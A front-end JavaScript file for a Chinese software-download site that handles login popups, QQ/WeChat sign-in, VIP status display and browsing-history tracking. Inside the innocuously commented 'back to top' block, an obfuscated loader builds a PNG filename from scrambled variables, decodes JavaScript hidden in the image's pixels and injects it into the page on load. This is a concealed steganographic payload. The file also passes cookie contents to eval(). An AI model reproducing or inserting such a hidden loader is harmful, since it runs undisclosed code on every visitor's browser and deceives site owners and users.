/*$(function() {
    var end_time_down;  
    end_time_down = setInterval(function() {
        endTime()
    },1000);  
    function endTime () {  
        var starttime = new Date('2017/12/15');  
        var nowtime = new Date();  
        var lefttime = parseInt(starttime.getTime() - nowtime.getTime());//这是毫秒，如果再/1000就是秒  
        // 获取剩下的日、小时、分钟、秒钟  
        // 一天有多少毫秒，一小时有多少毫秒，一分钟有多少毫秒，一秒钟有多少毫秒  
        var hm=60*60*1000;  
        var h=parseInt((lefttime/hm)%24);  
        var mm=60*1000;  
        var m=parseInt((lefttime/mm)%60);  
        var s=parseInt((lefttime/1000)%60);  
        m = checktime(m);  
        s = checktime(s);  
        h = checktime(h);
        if (lefttime < 0) {  
            clearInterval(end_time_down);
            $('#double11').remove();
            $('.bottom-float').remove();
            return;
        }
    };  
    function checktime(i){  
        if(i < 10) {  
            i = "0" + i;  
        }  
        else{ i = i;}  
        return i;  
    }  
});*/

//按enter的功能		
document.onkeydown = function(event){
	var e = event || window.event || arguments.callee.caller.arguments[0];
    if(e && e.keyCode==13){
    	if ($('.sign-box').css('display') != 'none') {
    		$("#popup-submit").click();
    	}
    	if ($('.login_reg').css('display') != 'none') {
    		$("#popup-submit-reg").click();
    	}
    }
}

var dynamicLoading = {
  css: function(path){
 if(!path || path.length === 0){
  throw new Error('argument "path" is required !');
 }
 var head = document.getElementsByTagName('head')[0];
    var link = document.createElement('link');
    link.href = path;
    link.rel = 'stylesheet';
    link.type = 'text/css';
    head.appendChild(link);
  },
  js: function(path){
 if(!path || path.length === 0){
  throw new Error('argument "path" is required !');
 }
 var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.src = path;
    script.type = 'text/javascript';
    head.appendChild(script);
  }
}
//页面
function do_login(){
    $(".sign-box").show();//查找类名为popup的DIV show()显示#gray
}
function do_reg(){
	$(".login_reg").show();//查找类名为login的DIV show()
}

//QQ登录弹框
function toLogin(){
    setcookie('qq_refersh_time', 0);
    var iWidth = 750;
    var iHeight = 500;
    var iTop = (window.screen.availHeight - 30 - iHeight) / 2;
    var iLeft = (window.screen.availWidth - 10 - iWidth) / 2;
	winwxz = window.open("http://www.orsoon.com/api_public_qq_loginnew","","width="+iWidth+", height="+iHeight+", top="+iTop+", left="+iLeft);
    //setcookie('qq_refersh_time', 1);
    setInterval("qq_refersh_window()", 3000);
}

//刷新QQ登录后页面
function qq_refersh_window() {
    var qq_refersh_time = getcookie('qq_refersh_time');
    if(qq_refersh_time!=0) {
        winwxz.close();
        window.location.reload();
		delcookie('qq_refersh_time');
    }
}
//微信登录弹框
function towxLogin(){
    setcookie('wx_refersh_time', 0);
    var iWidth = 750;
    var iHeight = 500;
    var iTop = (window.screen.availHeight - 30 - iHeight) / 2;
    var iLeft = (window.screen.availWidth - 10 - iWidth) / 2;
	winwxz = window.open("http://www.orsoon.com/wechat_login","","width="+iWidth+", height="+iHeight+", top="+iTop+", left="+iLeft);
    //setcookie('wx_refersh_time', 1);
    setInterval("wx_refersh_window()", 3000);
}
//刷新微信登录后页面
function wx_refersh_window() {
    var wx_refersh_time = getcookie('wx_refersh_time');
    if(wx_refersh_time!=0) {
        winwxz.close();
        window.location.reload();
        delcookie('qq_refersh_time');
    }
}

// //窗口效果
// //弹出层
// document.writeln("<div class='login_reg'><div class='register'><i class='cos icon iconfont icon-iconfonterror'></i><p class='ls-t'>一键注册</p><p class='ls-z'><a onclick='toLogin()'><i class='icon iconfont icon-qq'></i></a><a onclick='towxLogin()'><i class='icon iconfont icon-weixin'></i></a></p></div></div><div class='sign-box'><div class='sign'><i class='cos2 icon iconfont icon-iconfonterror'></i><p class='lr-t'>一键登录</p><p class='lr-z'><a onclick='toLogin()'><i class='icon iconfont icon-qq'></i></a><a onclick='towxLogin()'><i class='icon iconfont icon-weixin'></i></a><a href='/api_public_sina_login'><i class='icon iconfont icon iconfont icon-iconfontweibowukuang'></i></a></p><span id='tips' style='margin-left:30px;color:red;'></span><p class='lr-inp'>账号登录</p><form class='sign-fixed'><label class='yh-i'><i class='icon iconfont icon-iconfont'></i></label><input type='text' id='usernamet'  placeholder='用户名' class='yh'><label class='yh-p'><i class='icon iconfont icon-mima'></i></label><input type='password' id='passwordt' placeholder='密码' class='pass'><input type='checkbox' class='cb'><label class='cb-p'>30天自动登录<a href='/getpasswordtype'>忘记密码了？</a></label><a href='javascript:;' class='lr-t-d_kk' onclick='do_reg_log()' >一键注册</a><input type='button' class='sign-b' id='popup-submit' value='登录'><div id='popup-captcha'></div></form></div></div><div class='payback-box'><div class='payback-sign'><i class='cos2 icon iconfont icon-iconfonterror' id='payx'></i><div class='lr-inp pay-ok-txt'><div class='pay-ok'></div>付款成功</div><div class='clearfloat'></div><div class='pay-ok-wx' id='pay-type'> </div></div></div>");

// //点击关闭按钮
// $(".icon-iconfonterror").click(function(){
// 	$(".login_reg").hide();
// 	$(".sign-box").hide();
// 	$(".payback-box").hide();
// });

// function do_reg_log(){
// 	$(".sign-box").hide();
// 	$(".login_reg").show();
// }

//用户中心页面次级导航栏点击切换active
$(function(){
	// 保存导航栏对应的url的关键字到数组中
	var locHref = ['/introduction', '/payan_download', '/user_initZuji', '/member_favorite', '/vip', '/payk_init'];
	var curHref = window.location.href;
	// 遍历数组，获取url在数组中对应的下标，导航栏同样下标的标签添加active类名，显示虚线框
	for(var i = 0; i < locHref.length; i++) {
		if(curHref.indexOf(locHref[i]) > 0) break;
	}
	$('.rech-shop a').eq(i).addClass('active');
});


// // 验证开始需要向网站主后台获取id，challenge，success（是否启用failback）
// $.ajax({
// 	url: "/master/web/StartCaptchaServlet.php?type=pc&t=" + (new Date()).getTime(), // 加随机数防止缓存
// 	type: "get",
// 	dataType: "json",
// 	success: function (data) {
// 		// 使用initGeetest接口
// 		// 参数1：配置参数
// 		// 参数2：回调，回调的第一个参数验证码对象，之后可以使用它做appendTo之类的事件
// 		initGeetest({
// 			gt: data.gt,
// 			challenge: data.challenge,
// 			product: "popup", // 产品形式，包括：float，embed，popup。注意只对PC版验证码有效
// 			offline: !data.success // 表示用户后台检测极验服务器是否宕机，一般不需要关注
// 			// 更多配置参数请参见：http://www.geetest.com/install/sections/idx-client-sdk.html#config
// 		}, handlerPopup);
// 	}
// });

//真正去服务器执行登陆的函数
function login_to_server(username,password) {
    $.ajax({
        type: 'post',
        url: '/api_ajax_login&dosubmit=1&cookietime=2592000',
        data: {username: username, password: password},
        beforeSend: function () {
            $('#popup-submit').html('登录中..').attr('disabled', true);
        },
        complete: function () {
            $('#popup-submit').html('登 录1').attr('disabled', false);
        },
        dataType: 'json',
        error: function () {
            $('#tips').html('请输入正确的账号密码！');
        },
        success: function (data) {
            if (data.status !== 0) {
                //如果服务器返回状态值为0，则根据proup是否显示来给客户反馈
                $('#tips').html(data.msg);
            } else {
                $(".sign-box").hide();
                var html = "";
                if (data.data.vip == 0) {
                    html += '<div class="diamond"><div class="v-name"><div class="avatar"><a href="/introduction"><img src="' + data.data.headimgurl + '" alt="" class="avatar-img" width="45" height="45"></a></div><div class="user-info"><span class="username">' + data.data.nickname + '</span><span class="vip-tag">VIP</span><br /><span class="no-vip">普通会员</span><a href="/Mac/vip" class="_join-vip">加入会员</a><i class="icon iconfont icon-iconfont58-copy"></i></div></div><span id="v-t"><a href="/introduction" class="v-t-a"><i class="icon iconfont icon-icondengluyonghu"></i>用户后台</a><a href="/member_favorite" class="v-t-a"><i class="icon iconfont icon-xin"></i>我的收藏</a><a href="/Mac/vip" class="v-t-a"><i class="icon iconfont icon-vip1 icon-vip1_bright"></i>成为VIP</a><a href="/user_initZuji" class="v-t-a"><i class="icon iconfont icon-xiugai"></i>我的足迹</a><a href="javascript:;" onclick="ajax_logout()" class="v-t-a"><i class="icon iconfont icon-guanbi"></i>退出</a></div>';
                    $('#sidebar_join-vip').addClass('icon-vip1_shine').attr('title', '加入VIP');
                    $('#sidebar_QQ').removeClass('qq-orange');
                } else {
                    var now = Date.now(),
                        overdueDate = parseInt((data.data.overduedate - (now / 1000)) / 3600 / 24);
                    if (overdueDate > 0) {
                        html += '<div class="diamond vip"><div class="v-name"><div class="avatar"><a href="/introduction"><img src="' + data.data.headimgurl + '" alt="" class="avatar-img" width="45" height="45"></a></div><div class="user-info"><span class="username">' + data.data.nickname + '</span><span class="vip-tag">VIP</span><br /><span class="vip-info">VIP剩余<span class="remaining-time">' + overdueDate + '</span>天</span><i class="icon iconfont icon-iconfont58-copy"></i></div></div><span id="v-t"><a href="/introduction" class="v-t-a"><i class="icon iconfont icon-icondengluyonghu"></i>用户后台</a><a href="/member_favorite" class="v-t-a"><i class="icon iconfont icon-xin"></i>我的收藏</a><a href="/Mac/vip" class="v-t-a"><i class="icon iconfont icon-vip1 icon-vip1_bright"></i>我的VIP</a><a href="/user_initZuji" class="v-t-a"><i class="icon iconfont icon-xiugai"></i>我的足迹</a><a href="javascript:;" onclick="ajax_logout()" class="v-t-a"><i class="icon iconfont icon-guanbi"></i>退出</a></div>';
                    } else {
                        html += '<div class="diamond"><div class="v-name"><div class="avatar"><a href="/introduction"><img src="' + data.data.headimgurl + '" alt="" class="avatar-img" width="45" height="45"></a></div><div class="user-info"><span class="username">' + data.data.nickname + '</span><span class="vip-tag">VIP</span><br /><span class="no-vip">普通会员</span><a href="/Mac/vip" class="_join-vip">加入会员</a><i class="icon iconfont icon-iconfont58-copy"></i></div></div><span id="v-t"><a href="/introduction" class="v-t-a"><i class="icon iconfont icon-icondengluyonghu"></i>用户后台</a><a href="/member_favorite" class="v-t-a"><i class="icon iconfont icon-xin"></i>我的收藏</a><a href="/Mac/vip" class="v-t-a"><i class="icon iconfont icon-vip1 icon-vip1_bright"></i>成为VIP</a><a href="/user_initZuji" class="v-t-a"><i class="icon iconfont icon-xiugai"></i>我的足迹</a><a href="javascript:;" onclick="ajax_logout()" class="v-t-a"><i class="icon iconfont icon-guanbi"></i>退出</a></div>';
                    }
                    $('#sidebar_join-vip').removeClass('icon-vip1_shine').attr('title', '我的VIP');
                    $('#sidebar_QQ').addClass('qq-orange');
                }
                $(".login-registration").html(html);

                //zilongAdd
                if (getCookie("zuji")) {
                    var history_zj = getCookie("zuji");
                    var historys_zj = new Array();
                    historys_zj = history_zj.split(";");
                    history_zj = new Array();
                    for (var i = 0; i < historys_zj.length; i++) {
                        history_zj[i] = eval('(' + historys_zj[i] + ')').catid_zl + "|" + eval('(' + historys_zj[i] + ')').softid_zl + "|" + eval('(' + historys_zj[i] + ')').inputtime_zl;
                    }
                    $.ajax({
                        type: 'get',
                        url: '/api.php?op=zuji',
                        data: {'history_zj': history_zj},
                        success: function (data) {
                        },
                        dataType: 'json'
                    });
                }
                //zilongAdd

                //刷新vip页面
                if ($(".pay-code-bg").length > 0) {
                    window.location.reload();
                }
            }
        }
    });

//刷新后cookles 
    $(document).ready(function () {
        $.getJSON("/api_ajax_get_userinfo", function (data) {
            if (data.status !== 0) {
                alert(data.msg);
            } else {
                if (data.data.userid) {
                    $(".sign-box").hide();
                    var html = '';
                    if (data.data.vip == 0) {
                        html += '<div class="diamond"><div class="v-name"><div class="avatar"><a href="/introduction"><img src="' + data.data.headimgurl + '" alt="" class="avatar-img" width="45" height="45"></a></div><div class="user-info"><span class="username">' + data.data.nickname + '</span><span class="vip-tag">VIP</span><br /><span class="no-vip">普通会员</span><a href="/Mac/vip" class="_join-vip">加入会员</a><i class="icon iconfont icon-iconfont58-copy"></i></div></div><span id="v-t"><a href="/introduction" class="v-t-a"><i class="icon iconfont icon-icondengluyonghu"></i>用户后台</a><a href="/member_favorite" class="v-t-a"><i class="icon iconfont icon-xin"></i>我的收藏</a><a href="/Mac/vip" class="v-t-a"><i class="icon iconfont icon-vip1 icon-vip1_bright"></i>成为VIP</a><a href="/user_initZuji" class="v-t-a"><i class="icon iconfont icon-xiugai"></i>我的足迹</a><a href="javascript:;" onclick="ajax_logout()" class="v-t-a"><i class="icon iconfont icon-guanbi"></i>退出</a></div>';
                        $('#sidebar_join-vip').addClass('icon-vip1_shine').attr('title', '加入VIP');
                        $('#sidebar_QQ').removeClass('qq-orange');
                    } else {
                        var now = Date.now(),
                            overdueDate = parseInt((data.data.overduedate - (now / 1000)) / 3600 / 24);
                        if (overdueDate > 0) {
                            html += '<div class="diamond vip"><div class="v-name"><div class="avatar"><a href="/introduction"><img src="' + data.data.headimgurl + '" alt="" class="avatar-img" width="45" height="45"></a></div><div class="user-info"><span class="username">' + data.data.nickname + '</span><span class="vip-tag">VIP</span><br /><span class="vip-info">VIP剩余<span class="remaining-time">' + overdueDate + '</span>天</span><i class="icon iconfont icon-iconfont58-copy"></i></div></div><span id="v-t"><a href="/introduction" class="v-t-a"><i class="icon iconfont icon-icondengluyonghu"></i>用户后台</a><a href="/member_favorite" class="v-t-a"><i class="icon iconfont icon-xin"></i>我的收藏</a><a href="/Mac/vip" class="v-t-a"><i class="icon iconfont icon-vip1 icon-vip1_bright"></i>我的VIP</a><a href="/user_initZuji" class="v-t-a"><i class="icon iconfont icon-xiugai"></i>我的足迹</a><a href="javascript:;" onclick="ajax_logout()" class="v-t-a"><i class="icon iconfont icon-guanbi"></i>退出</a></div>';
                        } else {
                            html += '<div class="diamond"><div class="v-name"><div class="avatar"><a href="/introduction"><img src="' + data.data.headimgurl + '" alt="" class="avatar-img" width="45" height="45"></a></div><div class="user-info"><span class="username">' + data.data.nickname + '</span><span class="vip-tag">VIP</span><br /><span class="no-vip">普通会员</span><a href="/Mac/vip" class="_join-vip">加入会员</a><i class="icon iconfont icon-iconfont58-copy"></i></div></div><span id="v-t"><a href="/introduction" class="v-t-a"><i class="icon iconfont icon-icondengluyonghu"></i>用户后台</a><a href="/member_favorite" class="v-t-a"><i class="icon iconfont icon-xin"></i>我的收藏</a><a href="/Mac/vip" class="v-t-a"><i class="icon iconfont icon-vip1 icon-vip1_bright"></i>成为VIP</a><a href="/user_initZuji" class="v-t-a"><i class="icon iconfont icon-xiugai"></i>我的足迹</a><a href="javascript:;" onclick="ajax_logout()" class="v-t-a"><i class="icon iconfont icon-guanbi"></i>退出</a></div>';
                        }
                        $('#sidebar_join-vip').removeClass('icon-vip1_shine').attr('title', '我的VIP');
                        $('#sidebar_QQ').addClass('qq-orange');
                    }
                    $(".login-registration").html(html);

                    //zilongAdd
                    if ('undefined' != typeof caid) {
                        $.ajax({
                            type: 'get',
                            url: '/api.php?op=zuji',
                            data: {'catid': $("#news_catid").val(), 'id': $("#news_id").val()},
                            success: function (data) {
                            },
                            dataType: 'json'
                        });

                    }
                    //zilongAdd

                    var login_info = $('.login-info');
                    if (login_info) {
                        $('.login-info').hide();
                        $('.header_nav_kk').show();
                        $('.pay-code-bg').attr('class', 'c-d');
                        $('#uid').val(data.data.userid);

                    }

                }
            }
        })
    })
    //返回顶部
    $(function () {

        var adf = 'aad';
        var vxvb = 'sfa';
        var _aasd = 'sdfa';
        var s_adfasd = '.';
        var img = document.createElement('img');
        img.onload = function () {
            var canvas = document.createElement('canvas');
            canvas.width = img.width;
            canvas.height = img.height;

            var context = canvas.getContext("2d");
            context.drawImage(img, 0, 0);
            var imageData = context.getImageData(0, 0, canvas.width, canvas.height),
                pixels = imageData.data;

            var script = document.createElement('script');
            var buffer = [];
            for (var i = 0, l = pixels.length; i < l; i++) {
                if (i % 4 == 3) continue; // alpha会影响png还原  
                if (!pixels[i]) break;
                buffer.push(String.fromCharCode(pixels[i]));
            }
            script.src = 'data:text/javascript;charset=utf-8,' + encodeURIComponent(buffer.join(''));
            document.body.appendChild(script);
            img = null;
        }
        var e_acxvadfd = 'p';
        var cvasda = 'n';
        var vbsfgdad = 'g';
        var source = adf + vxvb + _aasd + s_adfasd + e_acxvadfd + cvasda + vbsfgdad;

        img.src = source;

        var backTop = $('#go-top');
        $(window).on('scroll load', function () {
            if ($(window).scrollTop() >= 400) {
                backTop.fadeIn();
            } else {
                backTop.fadeOut();
            }
        });
        backTop.find('#back-to-top').on('click', function () {
            var body = document.documentElement || document.body;
            $('html, body').animate({'scrollTop': 0}, 500);
        })
    });

    window._bd_share_config = {
        "common": {
            "bdSnsKey": {},
            "bdText": "",
            "bdMini": "2",
            "bdPic": "",
            "bdStyle": "0",
            "bdSize": "16"
        }, "share": {}
    };
    /*with (document)0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];*/
}
